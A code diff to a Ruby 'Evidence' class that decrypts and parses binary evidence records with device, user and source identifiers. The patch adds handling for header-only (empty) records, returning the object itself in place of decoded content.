@@ -50,6 +50,7 @@ class Evidence
     @key = key
     @version = Evidence.VERSION_ID
     @info = Hash.new.merge info
+    @info[:empty] = false
   end
   
   def extend_on_type(type)
@@ -151,6 +152,10 @@ class Evidence
   def read_uint32(data)
     data.read(4).unpack("I").shift
   end
+
+  def empty?
+    @info[:empty]
+  end
   
   def deserialize(data)
     
@@ -161,7 +166,9 @@ class Evidence
     
     # header
     header_length = read_uint32(binary_string)
-
+    
+    @info[:empty] = (binary_string.size == header_length + 4)
+    
     # decrypt header
     header_string = StringIO.new decrypt(binary_string.read header_length)
     @version = read_uint32(header_string)
@@ -178,7 +185,7 @@ class Evidence
     
     @info[:received] = Time.new.getgm
     @info[:acquired] = Time.from_filetime(time_h, time_l).getgm
-
+    
     @info[:device_id] = header_string.read(host_size).force_encoding('UTF-16LE').encode('UTF-8') unless host_size == 0
     @info[:user_id] = header_string.read(user_size).force_encoding('UTF-16LE').encode('UTF-8') unless user_size == 0
     @info[:source_id] = header_string.read(ip_size).force_encoding('UTF-16LE').encode('UTF-8') unless ip_size == 0
@@ -205,7 +212,7 @@ class Evidence
       @info[:chunks] << StringIO.new( decrypt(content) ).read(len)
     end
     
-    return decode_content
+    return @info[:empty] ? [self] : decode_content
   end
   
 end
